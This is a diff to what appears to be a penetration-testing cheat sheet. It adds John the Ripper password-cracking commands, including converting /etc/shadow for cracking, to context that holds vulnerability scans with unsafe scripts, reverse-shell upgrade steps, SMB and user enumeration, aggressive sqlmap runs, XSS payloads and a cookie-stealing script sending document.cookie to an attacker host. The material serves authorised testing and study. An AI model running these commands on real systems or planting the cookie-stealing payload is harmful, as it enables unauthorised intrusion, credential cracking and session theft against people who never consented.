@@ -42,6 +42,7 @@ sudo nmap -v -sS -Pn --script=vuln --script-args=unsafe=1 <target_ip>
 ## Reverse shell
 
 ### Upgrade Shell
+
 ```bash
 script /dev/null -c /bin/bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -55,6 +56,24 @@ stty raw -echo; fg
 reset
 # Set the TERM environment variable for full terminal functionality
 export TERM=xterm
+```
+
+## Password Cracking
+
+### John the Ripper
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+# Convert shadow file to John format
+unshadow /etc/shadow /etc/passwd > hash.txt
+
+# Show cracked passwords
+john --show hash.txt
+
+# Crack ZIP file password
+zip2john encrypted.zip > zip.hash
+john zip.hash
 ```
 
 # Network Services Pentesting
@@ -125,6 +144,7 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.
 ## 139,445 - SMB
 
 ### Obtain Information
+
 ```bash
 enum4linux-ng -A -u <username> -p <password> <target_ip>
 enum4linux -a -u <username> -p <password> <target_ip>
@@ -133,12 +153,14 @@ enum4linux -a -u 'guest' -p '' <target_ip>
 ```
 
 ### Get Sharelists
+
 ```bash
 smbclient -N -L <target_ip>
 nxc smb <target_ip> -u 'guest' -p '' --shares --verbose
 ```
 
 ### Enumerate Users
+
 ```bash
 # RID cycling with limited or no credentials
 # Useful for initial reconnaissance
@@ -156,6 +178,7 @@ enum4linux-ng -U -u <username> -p <password> <target_ip>
 ## SQL Injection
 
 ### SQLMap
+
 ```bash
 # Enumerate DBMS databases
 sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent --dbs
@@ -181,6 +204,7 @@ sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 -
 ## XSS
 
 ### Basic Payloads
+
 ```Properties files
 <script>alert('XSS');</script>
 <script>alert(document.cookie);</script>
@@ -189,6 +213,7 @@ sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 -
 ```
 
 ### Cookie Stealing
+
 ```Properties files
 # Redirect with cookies
 <script>document.location='http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie;</script>
@@ -207,5 +232,6 @@ sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 -
 ## Abusing Tokens
 
 ### SeBackupPrivilege
+
 - [Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
 - [Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#5c26)
